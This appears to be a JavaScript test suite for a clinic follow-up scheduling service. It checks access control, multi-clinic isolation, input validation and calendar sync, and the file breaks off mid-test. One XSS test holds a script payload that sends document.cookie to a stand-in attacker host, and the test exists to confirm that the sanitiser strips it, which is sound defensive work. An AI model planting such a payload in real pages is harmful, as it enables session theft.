/**
 * HEALTH VIBE AI: DOCTOR RECOMMEND FOLLOW-UP WINDOW QA, SECURITY & MEDICAL RESEARCH TEST SUITE (DOCTOLIB MODEL)
 *
 * Comprehensive verification of:
 * 1. Medical Research & Real-World Clinical Guideline Scenarios:
 *    - Scenario 1: Critical 24-Hour Follow-up (Acute COPD / Severe Asthma exacerbation with borderline SpO2).
 *    - Scenario 2: 72-Hour / 3-Day Antibiotic Response Review (Community-Acquired Pneumonia / Bacterial infection).
 *    - Scenario 3: 1-Week Post-Acute Stabilization & Titration (Uncontrolled Hypertension / Step-up Asthma regimen).
 *    - Scenario 4: 1-Month Routine Chronic Maintenance & Prevention (Stable Diabetes / COPD baseline review).
 *    - Scenario 5: Custom Date Follow-up with Calendar Slot Alignment (Preventing past dates).
 *    - Scenario 6: PRN / "As Needed" Follow-up with Explicit Emergency Red Flags.
 * 2. Strict Doctor-Patient Data Isolation & Cross-Doctor Boundary Defense:
 *    - Assigned Doctor: Authorized to recommend, modify, and sync follow-up plans.
 *    - Unassigned Doctor: Blocked from recommending (403 UNASSIGNED_DOCTOR_ACCESS_DENIED).
 *    - Unassigned Doctor: Blocked from viewing/snooping follow-up data (403 UNASSIGNED_DOCTOR_ACCESS_DENIED).
 *    - Unassigned Doctor: Blocked from syncing calendar appointments (403 UNASSIGNED_DOCTOR_ACCESS_DENIED).
 *    - Super Admin / CMO: Supervisory clinical access granted across departments.
 *    - Patient Access: Allowed to view own plan, strictly barred from creating or modifying doctor follow-up plans.
 * 3. Multi-Tenant Clinic Isolation (Organization Boundaries):
 *    - Cross-Clinic Doctor strictly blocked (403 CROSS_CLINIC_ACCESS_DENIED).
 *    - Multi-clinic accredited doctor verified across assigned organization clinics.
 * 4. Security Hardening & Privilege Escalation Prevention:
 *    - Patient and Nurse roles strictly rejected (403 DOCTOR_ROLE_REQUIRED).
 *    - Unapproved doctor applicant rejected (403 DOCTOR_NOT_VERIFIED).
 *    - Suspended or revoked doctor licenses barred (403 DOCTOR_LICENSE_INACTIVE).
 *    - Stored XSS vectors stripped and neutralized from clinical instructions & booking notes.
 *    - Closed and archived cases strictly protected from modification (400 CASE_CLOSED).
 *    - Boundary input validation: invalid window, invalid mode, past dates, missing target dates.
 * 5. Doctolib Calendar Synchronization & Slot Allocation:
 *    - Confirmed appointment slot creation in appointments collection.
 *    - Case status transition to CALENDAR_LINKED with appointment reference.
 *    - Multi-modal consultation support (clinic, video, phone).
 *    - Guard against syncing calendar on cases without established follow-up plans.
 * 6. Audit Trail Veracity, PHI Protection & Concurrency Governance:
 *    - Immutable audit records for DOCTOR_FOLLOWUP_RECOMMENDED and DOCTOR_FOLLOWUP_CALENDAR_LINKED.
 *    - Full actor metadata: UID, license number, specialty, IP address, user-agent, timestamps.
 *    - Verification of zero credential/token leakage in audit logs.
 *    - Clinical revision monotonic bump and statusHistory trajectory logging.
 * 7. Frontend UI Helpers, Doctolib 1-Click Sync & Bilingual Localisation Parity:
 *    - UI preset catalog matching backend catalog.
 *    - 1-Click booking transition helper state consistency.
 *    - Arabic and English translation parity for all follow-up terms.
 */

'use strict';

const assert = require('node:assert/strict');
const path = require('node:path');

// Setup minimal browser globals mock for UI components testing
const mockElements = new Map();
function createMockElement(id, tagName = 'div') {
  const el = {
    id,
    tagName: tagName.toUpperCase(),
    value: '',
    textContent: '',
    _innerHTML: '',
    style: {},
    classList: {
      _classes: new Set(),
      add: function(c) { this._classes.add(c); },
      remove: function(c) { this._classes.delete(c); },
      toggle: function(c, force) {
        if (force !== undefined) {
          if (force) this._classes.add(c); else this._classes.delete(c);
          return force;
        }
        if (this._classes.has(c)) { this._classes.delete(c); return false; }
        this._classes.add(c); return true;
      },
      contains: function(c) { return this._classes.has(c); }
    },
    dataset: {},
    attributes: new Map(),
    setAttribute: function(name, val) { this.attributes.set(name, String(val)); this[name] = val; },
    removeAttribute: function(name) { this.attributes.delete(name); delete this[name]; },
    getAttribute: function(name) { return this.attributes.has(name) ? this.attributes.get(name) : (this[name] || null); },
    focus: function() {},
    select: function() {},
    scrollIntoView: function() {},
    querySelector: function() { return null; },
    querySelectorAll: function() { return []; },
    addEventListener: function(event, handler) { this[`_on_${event}`] = handler; },
    removeEventListener: function(event) { delete this[`_on_${event}`]; },
    dispatchEvent: function(evt) {
      if (this[`_on_${evt.type}`]) this[`_on_${evt.type}`](evt);
    },
    remove: function() { mockElements.delete(id); }
  };
  Object.defineProperty(el, 'innerHTML', {
    get() { return this._innerHTML; },
    set(v) { this._innerHTML = String(v); }
  });
  mockElements.set(id, el);
  return el;
}

global.document = {
  activeElement: null,
  getElementById: (id) => mockElements.get(id) || null,
  querySelectorAll: (selector) => {
    const matched = [];
    mockElements.forEach((el) => {
      matched.push(el);
    });
    return matched;
  },
  createElement: (tagName) => createMockElement(`mock-${Date.now()}-${Math.random()}`, tagName),
  addEventListener: () => {}
};

global.window = global;
global.localStorage = {
  _data: new Map(),
  getItem: (k) => global.localStorage._data.get(k) || null,
  setItem: (k, v) => global.localStorage._data.set(k, String(v)),
  removeItem: (k) => global.localStorage._data.delete(k),
  clear: () => global.localStorage._data.clear()
};

global.showToast = (msg) => { global._lastToast = msg; };
global.showScreen = (screen) => { global._lastScreen = screen; };
global.selectAppointmentDate = (date) => { global._lastApptDate = date; };
global.setAppointmentType = (type) => { global._lastApptType = type; };
global.apptDaysList = [];

// Load Modules
const doctorFollowUpService = require('../backend/doctor-followup-service');
const DoctorUI = require('../app/modules/doctor/doctor-ui');
const i18n = require('../app/i18n');

console.log('================================================================================');
console.log('🩺 HEALTH VIBE AI: DOCTOR RECOMMEND FOLLOW-UP QA, SECURITY & RESEARCH SUITE');
console.log('   Doctolib Interactive Scheduling, Patient Isolation, RBAC & Audit Trails');
console.log('================================================================================\n');

// Mock In-Memory Firestore Database
class MockFirestoreCollection {
  constructor(name) {
    this.name = name;
    this.docs = new Map();
  }

  doc(id) {
    return {
      get: async () => ({
        exists: this.docs.has(id),
        id,
        data: () => (this.docs.has(id) ? JSON.parse(JSON.stringify(this.docs.get(id))) : null)
      }),
      update: async (patch) => {
        if (!this.docs.has(id)) throw new Error(`Document ${id} does not exist`);
        const existing = this.docs.get(id) || {};
        const updated = { ...existing, ...patch };
        this.docs.set(id, updated);
        return updated;
      },
      set: async (payload) => {
        this.docs.set(id, { id, ...payload });
        return this.docs.get(id);
      }
    };
  }

  async add(payload) {
    const id = `${this.name}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const docData = { id, ...payload };
    this.docs.set(id, docData);
    return { id, ...docData };
  }
}

class MockFirestoreDb {
  constructor() {
    this.collections = new Map();
  }

  collection(name) {
    if (!this.collections.has(name)) {
      this.collections.set(name, new MockFirestoreCollection(name));
    }
    return this.collections.get(name);
  }

  getAuditLogs() {
    return Array.from(this.collection('audit_logs').docs.values());
  }

  getCase(id) {
    return this.collection('cases').docs.get(id) || null;
  }

  getAppointments() {
    return Array.from(this.collection('appointments').docs.values());
  }
}

// Reusable Test Doctor & User Identities
const verifiedAssignedDoctor = {
  uid: 'doc_sarah_pulmo_101',
  role: 'doctor',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  licenseStatus: 'active',
  displayName: 'Dr. Sarah Al-Sayed',
  name: 'Dr. Sarah Al-Sayed',
  email: 'sarah.sayed@healthvibes.app',
  doctorLicense: 'EG-MED-84920',
  specialty: 'Pulmonology & Respiratory Medicine',
  clinicId: 'clinic_cairo_central'
};

const verifiedUnassignedDoctor = {
  uid: 'doc_kareem_internal_202',
  role: 'doctor',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  licenseStatus: 'active',
  displayName: 'Dr. Kareem Fahmy',
  name: 'Dr. Kareem Fahmy',
  email: 'kareem.fahmy@healthvibes.app',
  doctorLicense: 'EG-MED-91234',
  specialty: 'Internal Medicine & Critical Care',
  clinicId: 'clinic_cairo_central'
};

const crossClinicDoctor = {
  uid: 'doc_hassan_alex_303',
  role: 'doctor',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  licenseStatus: 'active',
  displayName: 'Dr. Hassan Mansour',
  name: 'Dr. Hassan Mansour',
  email: 'hassan.mansour@alex-health.app',
  doctorLicense: 'EG-MED-65432',
  specialty: 'Chest & Allergy Diseases',
  clinicId: 'clinic_alexandria_central'
};

const multiClinicAccreditedDoctor = {
  uid: 'doc_mona_consultant_404',
  role: 'doctor',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  licenseStatus: 'active',
  displayName: 'Dr. Mona Radwan',
  name: 'Dr. Mona Radwan',
  email: 'mona.radwan@healthvibes.app',
  doctorLicense: 'EG-MED-77112',
  specialty: 'Respiratory Medicine & Sleep Disorders',
  clinicId: 'clinic_cairo_central',
  clinics: [
    { clinicId: 'clinic_cairo_central', status: 'approved' },
    { clinicId: 'clinic_giza_branch', status: 'approved' }
  ]
};

const unapprovedApplicantDoctor = {
  uid: 'doc_pending_applicant_505',
  role: 'doctor',
  verifiedDoctor: false,
  doctorApplicationStatus: 'pending',
  licenseStatus: 'active',
  displayName: 'Dr. Pending Applicant',
  name: 'Dr. Pending Applicant',
  email: 'pending.doc@healthvibes.app',
  doctorLicense: 'EG-MED-PENDING-1',
  specialty: 'General Practice',
  clinicId: 'clinic_cairo_central'
};

const suspendedLicenseDoctor = {
  uid: 'doc_suspended_606',
  role: 'doctor',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  licenseStatus: 'suspended',
  displayName: 'Dr. Suspended Practitioner',
  name: 'Dr. Suspended Practitioner',
  email: 'suspended.doc@healthvibes.app',
  doctorLicense: 'EG-MED-REVOKED-9',
  specialty: 'Internal Medicine',
  clinicId: 'clinic_cairo_central'
};

const superAdminUser = {
  uid: 'super_admin_cmo_001',
  role: 'super_admin',
  verifiedDoctor: true,
  doctorApplicationStatus: 'approved',
  displayName: 'Prof. Tarek Zaki (CMO & Super Admin)',
  name: 'Prof. Tarek Zaki',
  email: 'cmo@healthvibes.app'
};

const patientUser = {
  uid: 'pat_ahmed_123',
  role: 'patient',
  displayName: 'Ahmed Mahmoud',
  name: 'Ahmed Mahmoud',
  email: 'ahmed.mahmoud@gmail.com'
};

const nurseUser = {
  uid: 'nurse_layla_789',
  role: 'nurse',
  displayName: 'Layla Tantaoui (RN)',
  name: 'Layla Tantaoui',
  email: 'layla.nurse@healthvibes.app'
};

(async () => {
  let testsCount = 0;
  let passedCount = 0;

  function markPassed(testName, details = '') {
    testsCount++;
    passedCount++;
    console.log(`  [PASS] Test ${testsCount}: ${testName}${details ? ` -> ${details}` : ''}`);
  }

  // ===========================================================================
  // SECTION 1: MEDICAL RESEARCH & REAL-WORLD CLINICAL SCENARIOS (DOCTOLIB)
  // ===========================================================================
  console.log('▶ SECTION 1: Medical Research & Clinical Guideline Scenarios (Doctolib Model)\n');

  const db = new MockFirestoreDb();

  // Scenario 1: Critical 24-Hour Follow-up (Acute COPD Exacerbation / Borderline SpO2)
  const caseId1 = 'case_acute_copd_001';
  await db.collection('cases').doc(caseId1).set({
    id: caseId1,
    status: 'under_review',
    patientId: 'pat_ahmed_123',
    patientName: 'Ahmed Mahmoud',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    assignedDoctorEmail: verifiedAssignedDoctor.email,
    clinicalRevision: 1,
    vitals: { spo2: 93, heartRate: 104, respiratoryRate: 24, temp: 37.8 },
    diagnosis: 'Acute Exacerbation of Chronic Obstructive Pulmonary Disease (AECOPD)'
  });

  const res1 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId1,
    {
      window: 'within_24h',
      mode: 'clinic',
      instructions: 'Urgent in-clinic re-evaluation within 24h. Return immediately to ER if SpO2 drops below 92% or severe dyspnea occurs.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor,
      metadata: { ip: '156.204.18.10', userAgent: 'HealthVibe-Clinic/2.4' }
    }
  );

  assert.strictEqual(res1.success, true);
  assert.strictEqual(res1.followUpPlan.window, 'within_24h');
  assert.strictEqual(res1.followUpPlan.urgency, 'urgent');
  assert.strictEqual(res1.followUpPlan.daysFromNow, 1);
  assert.strictEqual(res1.followUpPlan.mode, 'clinic');
  assert.strictEqual(res1.followUpPlan.status, 'RECOMMENDED');
  assert.strictEqual(res1.clinicalRevision, 2);
  const savedCase1 = db.getCase(caseId1);
  assert.strictEqual(savedCase1.followUpPlan.urgency, 'urgent');
  assert.strictEqual(savedCase1.followUpPlan.recommendedBy.name, verifiedAssignedDoctor.displayName);
  markPassed(
    'Scenario 1: Critical 24-Hour Follow-up (AECOPD / Borderline SpO2)',
    'Urgency=urgent, 1 day timeframe, in-clinic protocol verified'
  );

  // Scenario 2: 72-Hour / 3-Day Antibiotic Response Review (Community-Acquired Pneumonia)
  const caseId2 = 'case_cap_pneumonia_002';
  await db.collection('cases').doc(caseId2).set({
    id: caseId2,
    status: 'under_review',
    patientId: 'pat_mona_456',
    patientName: 'Mona El-Shennawy',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1,
    vitals: { spo2: 96, heartRate: 88, temp: 38.6 },
    diagnosis: 'Right Lower Lobe Community-Acquired Pneumonia (CAP)'
  });

  const res2 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId2,
    {
      window: 'within_3d',
      mode: 'video',
      instructions: 'Telehealth review at 72 hours to verify temperature defervescence and sputum reduction after Amoxicillin-Clavulanate.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor,
      metadata: { ip: '156.204.18.10' }
    }
  );

  assert.strictEqual(res2.success, true);
  assert.strictEqual(res2.followUpPlan.window, 'within_3d');
  assert.strictEqual(res2.followUpPlan.urgency, 'high');
  assert.strictEqual(res2.followUpPlan.daysFromNow, 3);
  assert.strictEqual(res2.followUpPlan.mode, 'video');
  markPassed(
    'Scenario 2: 72-Hour / 3-Day Antibiotic Response Assessment',
    'Urgency=high, 3 days timeframe, video telehealth mode verified'
  );

  // Scenario 3: 1-Week Chronic Post-Acute Stabilization (Uncontrolled Hypertension & Wheezing)
  const caseId3 = 'case_htn_asthma_003';
  await db.collection('cases').doc(caseId3).set({
    id: caseId3,
    status: 'under_review',
    patientId: 'pat_tarek_789',
    patientName: 'Tarek Nabil',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1
  });

  const res3 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId3,
    {
      window: 'within_1w',
      mode: 'clinic',
      instructions: 'Review 7-day home blood pressure and peak expiratory flow (PEF) diary. Titrate inhaler dosage if nocturnal wheezing persists.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor
    }
  );

  assert.strictEqual(res3.success, true);
  assert.strictEqual(res3.followUpPlan.window, 'within_1w');
  assert.strictEqual(res3.followUpPlan.urgency, 'routine');
  assert.strictEqual(res3.followUpPlan.daysFromNow, 7);
  markPassed(
    'Scenario 3: 1-Week Post-Acute Stabilization & Peak Flow Titration',
    'Urgency=routine, 7 days timeframe, home log instructions verified'
  );

  // Scenario 4: 1-Month Routine Maintenance Review (Stable Asthma / T2DM)
  const caseId4 = 'case_stable_asthma_004';
  await db.collection('cases').doc(caseId4).set({
    id: caseId4,
    status: 'under_review',
    patientId: 'pat_layla_321',
    patientName: 'Layla Hamed',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1
  });

  const res4 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId4,
    {
      window: 'within_1m',
      mode: 'phone',
      instructions: 'Routine 30-day maintenance follow-up call. Assess adherence to fluticasone/salmeterol maintenance inhaler.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor
    }
  );

  assert.strictEqual(res4.success, true);
  assert.strictEqual(res4.followUpPlan.window, 'within_1m');
  assert.strictEqual(res4.followUpPlan.urgency, 'maintenance');
  assert.strictEqual(res4.followUpPlan.daysFromNow, 30);
  assert.strictEqual(res4.followUpPlan.mode, 'phone');
  markPassed(
    'Scenario 4: 1-Month Routine Chronic Maintenance & Medication Adherence',
    'Urgency=maintenance, 30 days timeframe, phone follow-up verified'
  );

  // Scenario 5: Custom Date Follow-up with Specific Calendar Alignment
  const caseId5 = 'case_custom_sched_005';
  await db.collection('cases').doc(caseId5).set({
    id: caseId5,
    status: 'under_review',
    patientId: 'pat_omar_654',
    patientName: 'Omar Farouk',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1
  });

  const futureTarget = new Date();
  futureTarget.setDate(futureTarget.getDate() + 10);
  const futureTargetStr = `${futureTarget.getFullYear()}-${String(futureTarget.getMonth() + 1).padStart(2, '0')}-${String(futureTarget.getDate()).padStart(2, '0')}`;

  const res5 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId5,
    {
      window: 'custom',
      targetDate: futureTargetStr,
      mode: 'clinic',
      instructions: 'Post-bronchoscopy follow-up aligned with Tuesday outpatient pulmonary clinic session.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor
    }
  );

  assert.strictEqual(res5.success, true);
  assert.strictEqual(res5.followUpPlan.window, 'custom');
  assert.strictEqual(res5.followUpPlan.targetDate, futureTargetStr);
  assert.strictEqual(res5.followUpPlan.daysFromNow, 10);
  markPassed(
    'Scenario 5: Custom Date Specific Scheduling Aligned to Clinic Outpatient Session',
    `Target date=${futureTargetStr}, 10 days calculated accurately`
  );

  // Scenario 6: PRN / "As Needed" Follow-up with Explicit Emergency Red Flags
  const caseId6 = 'case_prn_viral_006';
  await db.collection('cases').doc(caseId6).set({
    id: caseId6,
    status: 'under_review',
    patientId: 'pat_sami_987',
    patientName: 'Sami Roushdy',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1
  });

  const res6 = await doctorFollowUpService.recommendCaseFollowUp(
    caseId6,
    {
      window: 'as_needed',
      mode: 'clinic',
      instructions: 'Mild viral upper respiratory infection. Return to clinic only if fever > 38.5C persists beyond 3 days, hemoptysis occurs, or breathing worsens.'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor
    }
  );

  assert.strictEqual(res6.success, true);
  assert.strictEqual(res6.followUpPlan.window, 'as_needed');
  assert.strictEqual(res6.followUpPlan.daysFromNow, 0);
  assert.strictEqual(res6.followUpPlan.targetDate, '');
  assert(res6.followUpPlan.targetDateFormattedAr.includes('عند ظهور الأعراض'));
  markPassed(
    'Scenario 6: PRN / As Needed Follow-up with Emergency Red Flag Warnings',
    'Correct PRN formatting, zero offset, emergency return triggers preserved\n'
  );

  // ===========================================================================
  // SECTION 2: STRICT DOCTOR-PATIENT DATA ISOLATION & ACCESS CONTROL
  // ===========================================================================
  console.log('▶ SECTION 2: Doctor-Patient Data Isolation & Cross-Doctor Security Guard\n');

  // Test 2A: Unassigned Doctor Blocked from Recommending Follow-up
  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1, // Assigned to Dr. Sarah (doc_sarah_pulmo_101)
        { window: 'within_1w', mode: 'clinic' },
        {
          db,
          user: verifiedUnassignedDoctor, // Dr. Kareem (doc_kareem_internal_202)
          doctorProfile: verifiedUnassignedDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'UNASSIGNED_DOCTOR_ACCESS_DENIED');
      return true;
    }
  );
  markPassed(
    'Security 2A: Unassigned Doctor Blocked from Modifying Follow-up',
    'Strict 403 UNASSIGNED_DOCTOR_ACCESS_DENIED raised'
  );

  // Test 2B: Unassigned Doctor Snooping Blocked from Reading Follow-up Plan
  await assert.rejects(
    async () => {
      await doctorFollowUpService.getCaseFollowUp(caseId1, {
        db,
        user: verifiedUnassignedDoctor,
        doctorProfile: verifiedUnassignedDoctor
      });
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'UNASSIGNED_DOCTOR_ACCESS_DENIED');
      return true;
    }
  );
  markPassed(
    'Security 2B: Unassigned Doctor Blocked from Viewing Follow-up Data',
    'Patient telemetry & doctor directives protected against snooping'
  );

  // Test 2C: Unassigned Doctor Blocked from Syncing Calendar Appointment
  await assert.rejects(
    async () => {
      await doctorFollowUpService.syncFollowUpWithCalendar(
        caseId1,
        { slotId: 'slot_rogue_sync' },
        {
          db,
          user: verifiedUnassignedDoctor,
          doctorProfile: verifiedUnassignedDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'UNASSIGNED_DOCTOR_ACCESS_DENIED');
      return true;
    }
  );
  markPassed(
    'Security 2C: Unassigned Doctor Blocked from Doctolib Calendar Booking',
    'Slot tampering and unassigned calendar mutation prevented'
  );

  // Test 2D: Supervisory Access for Super Admin / CMO Granted
  const cmoRead = await doctorFollowUpService.getCaseFollowUp(caseId1, {
    db,
    user: superAdminUser,
    doctorProfile: superAdminUser
  });
  assert.strictEqual(cmoRead.success, true);
  assert.strictEqual(cmoRead.followUpPlan.window, 'within_24h');
  markPassed(
    'Security 2D: Super Admin / CMO Supervisory Oversight Permitted',
    'Clinical governance access permitted across all assigned doctors'
  );

  // Test 2E: Patient Access Boundary: Patient Can Read Own Plan, Cannot Forage / Recommend
  const patRead = await doctorFollowUpService.getCaseFollowUp(caseId1, {
    db,
    user: patientUser
  });
  assert.strictEqual(patRead.success, true);
  assert.strictEqual(patRead.followUpPlan.window, 'within_24h');

  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1,
        { window: 'within_1m' },
        {
          db,
          user: patientUser
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'DOCTOR_ROLE_REQUIRED');
      return true;
    }
  );
  markPassed(
    'Security 2E: Patient Access Boundary Verified',
    'Patient reads own follow-up; strictly forbidden from creating/editing follow-up\n'
  );

  // ===========================================================================
  // SECTION 3: MULTI-TENANT CLINIC ISOLATION (ORGANIZATION BOUNDARIES)
  // ===========================================================================
  console.log('▶ SECTION 3: Multi-Tenant Clinic Isolation (Organization Boundaries)\n');

  // Test 3A: Cross-Clinic Doctor Blocked from Recommending Follow-up
  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1, // Belongs to clinic_cairo_central
        { window: 'within_3d' },
        {
          db,
          user: crossClinicDoctor, // Belongs to clinic_alexandria_central
          doctorProfile: crossClinicDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'CROSS_CLINIC_ACCESS_DENIED');
      return true;
    }
  );
  markPassed(
    'Security 3A: Cross-Clinic Doctor Blocked from Other Clinic Cases',
    '403 CROSS_CLINIC_ACCESS_DENIED strictly enforced'
  );

  // Test 3B: Cross-Clinic Doctor Blocked from Calendar Booking
  await assert.rejects(
    async () => {
      await doctorFollowUpService.syncFollowUpWithCalendar(
        caseId1,
        {},
        {
          db,
          user: crossClinicDoctor,
          doctorProfile: crossClinicDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'CROSS_CLINIC_ACCESS_DENIED');
      return true;
    }
  );
  markPassed(
    'Security 3B: Cross-Clinic Calendar Synchronization Blocked',
    'Strict multi-tenant organizational boundary verified'
  );

  // Test 3C: Multi-Clinic Accredited Doctor Permitted at Assigned Clinic
  const caseIdGiza = 'case_giza_branch_007';
  await db.collection('cases').doc(caseIdGiza).set({
    id: caseIdGiza,
    status: 'under_review',
    patientId: 'pat_yasser_777',
    clinicId: 'clinic_giza_branch',
    assignedDoctorId: multiClinicAccreditedDoctor.uid,
    clinicalRevision: 1
  });

  const resGiza = await doctorFollowUpService.recommendCaseFollowUp(
    caseIdGiza,
    { window: 'within_1w', mode: 'clinic' },
    {
      db,
      user: multiClinicAccreditedDoctor,
      doctorProfile: multiClinicAccreditedDoctor
    }
  );
  assert.strictEqual(resGiza.success, true);
  assert.strictEqual(resGiza.followUpPlan.window, 'within_1w');
  markPassed(
    'Security 3C: Multi-Clinic Accredited Physician Authorized',
    'Doctor accredited in multiple branches permitted across authorized clinics\n'
  );

  // ===========================================================================
  // SECTION 4: PRIVILEGE ESCALATION PREVENTION & SECURITY ATTACK DEFENSE
  // ===========================================================================
  console.log('▶ SECTION 4: Security Attack Surface Hardening & Privilege Escalation Defense\n');

  // Test 4A: Nurse Role Privilege Escalation Blocked
  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1,
        { window: 'within_3d' },
        {
          db,
          user: nurseUser
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'DOCTOR_ROLE_REQUIRED');
      return true;
    }
  );
  markPassed(
    'Security 4A: Nurse Role Privilege Escalation Blocked',
    'Non-physician clinical roles strictly forbidden from clinical follow-up orders'
  );

  // Test 4B: Unapproved Doctor Applicant Blocked
  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1,
        { window: 'within_3d' },
        {
          db,
          user: unapprovedApplicantDoctor,
          doctorProfile: unapprovedApplicantDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'DOCTOR_NOT_VERIFIED');
      return true;
    }
  );
  markPassed(
    'Security 4B: Unapproved Doctor Applicant Rejected',
    'Unvetted physician applicants barred with 403 DOCTOR_NOT_VERIFIED'
  );

  // Test 4C: Suspended Syndicate License Blocked
  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseId1,
        { window: 'within_3d' },
        {
          db,
          user: suspendedLicenseDoctor,
          doctorProfile: suspendedLicenseDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 403);
      assert.strictEqual(err.code, 'DOCTOR_LICENSE_INACTIVE');
      return true;
    }
  );
  markPassed(
    'Security 4C: Suspended Doctor Syndicate License Barred',
    'Disciplinary or expired licenses prevented from issuing medical orders'
  );

  // Test 4D: Stored XSS Neutralization in Doctor Instructions
  const caseIdXss = 'case_xss_test_008';
  await db.collection('cases').doc(caseIdXss).set({
    id: caseIdXss,
    status: 'under_review',
    patientId: 'pat_test_888',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 1
  });

  const maliciousInstructions = 'Daily peak flow measurement. <script>fetch("https://attacker.org?steal="+document.cookie)</script><img src=x onerror=alert("XSS")><style>body{display:none}</style><b>Important:</b> Inhale deeply.';
  const resXss = await doctorFollowUpService.recommendCaseFollowUp(
    caseIdXss,
    {
      window: 'within_3d',
      mode: 'clinic',
      instructions: maliciousInstructions
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor
    }
  );

  assert.strictEqual(resXss.success, true);
  const cleanInstructions = resXss.followUpPlan.instructions;
  assert(!cleanInstructions.includes('<script>'), 'Script tag must be stripped');
  assert(!cleanInstructions.includes('onerror'), 'Event handler must be stripped');
  assert(!cleanInstructions.includes('<style>'), 'Style tag must be stripped');
  assert(!cleanInstructions.includes('<b>'), 'HTML tags must be stripped');
  assert(cleanInstructions.includes('Daily peak flow measurement.'), 'Safe text preserved');
  markPassed(
    'Security 4D: Stored XSS Script Injection Sanitized',
    'Script, style, and event-handler vectors stripped completely'
  );

  // Test 4E: Closed & Archived Case Modification Blocked
  const caseIdClosed = 'case_closed_archive_009';
  await db.collection('cases').doc(caseIdClosed).set({
    id: caseIdClosed,
    status: 'closed',
    patientId: 'pat_archived_999',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid,
    clinicalRevision: 5
  });

  await assert.rejects(
    async () => {
      await doctorFollowUpService.recommendCaseFollowUp(
        caseIdClosed,
        { window: 'within_1w' },
        {
          db,
          user: verifiedAssignedDoctor,
          doctorProfile: verifiedAssignedDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 400);
      assert.strictEqual(err.code, 'CASE_CLOSED');
      return true;
    }
  );
  markPassed(
    'Security 4E: Modification Guard on Closed/Archived Cases',
    'Closed cases strictly immutable against post-closure tampering'
  );

  // Test 4F: Input Boundary Validations (Invalid Window, Past Dates, Missing Custom Date)
  await assert.rejects(
    async () => doctorFollowUpService.validateFollowUpPlanInput({ window: 'within_6_months' }),
    { code: 'INVALID_WINDOW', statusCode: 400 }
  );

  await assert.rejects(
    async () => doctorFollowUpService.validateFollowUpPlanInput({ window: 'within_3d', mode: 'telepathy' }),
    { code: 'INVALID_MODE', statusCode: 400 }
  );

  await assert.rejects(
    async () => doctorFollowUpService.validateFollowUpPlanInput({ window: 'custom' }),
    { code: 'TARGET_DATE_REQUIRED', statusCode: 400 }
  );

  await assert.rejects(
    async () => doctorFollowUpService.validateFollowUpPlanInput({ window: 'custom', targetDate: '2020-01-01' }),
    { code: 'PAST_DATE_NOT_ALLOWED', statusCode: 400 }
  );
  markPassed(
    'Security 4F: Input Boundary & Past Date Prevention',
    'Catalog adherence, modal constraints, and ISO date integrity verified\n'
  );

  // ===========================================================================
  // SECTION 5: DOCTOLIB CALENDAR SYNCHRONIZATION & BOOKING INTEGRATION
  // ===========================================================================
  console.log('▶ SECTION 5: Doctolib Calendar Synchronization & Slot Allocation\n');

  // Test 5A: 1-Click Calendar Booking for Recommended Follow-up Plan
  const syncRes = await doctorFollowUpService.syncFollowUpWithCalendar(
    caseId1,
    {
